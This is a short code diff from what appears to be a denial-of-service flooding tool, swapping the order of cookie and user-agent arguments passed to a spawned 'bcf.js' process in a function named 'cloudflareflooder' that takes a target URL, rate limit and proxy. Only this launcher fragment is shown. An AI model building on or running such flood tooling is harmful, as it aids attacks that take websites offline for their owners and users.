@@ -95,7 +95,7 @@ function spawnKittyProcess(url, userAgent, time, cookie, method, thread, proxy, 
 
 function cloudflareflooder(url, userAgent, time, ratelimit, proxy, cookie) {
 	return new Promise((resolve, reject) => {
-		const args = [url, time, '1', ratelimit, proxy, userAgent, cookie];
+		const args = [url, time, '1', ratelimit, proxy, cookie, userAgent];
 		const cloudflareflooder = spawn('node', ['bcf.js', ...args]);
 
 		cloudflareflooder.stdout.on('data', (data) => {
